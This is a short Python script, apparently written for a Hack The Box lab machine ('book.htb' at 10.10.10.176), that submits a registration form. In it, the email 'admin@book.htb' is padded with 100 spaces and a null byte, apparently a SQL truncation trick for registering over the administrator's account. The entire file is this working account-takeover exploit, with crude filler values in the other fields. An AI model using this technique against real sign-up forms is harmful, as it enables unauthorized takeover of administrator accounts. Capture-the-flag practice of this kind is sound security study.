#!/usr/bin/env python3

from requests import Request, Session

URI = 'http://10.10.10.176/index.php'
payload = {
        'name': 'lol',
        'email': 'admin@book.htb' + ' '*100 + '\x00',
        'password': 'fuck'
        }

def main():
    s = Session()
    req = Request('POST', URI, data=payload)
    prepped = req.prepare()
    resp = s.send(prepped)
    print( f'[*] Status code: {resp.status_code}' )

if __name__=="__main__":
    main()
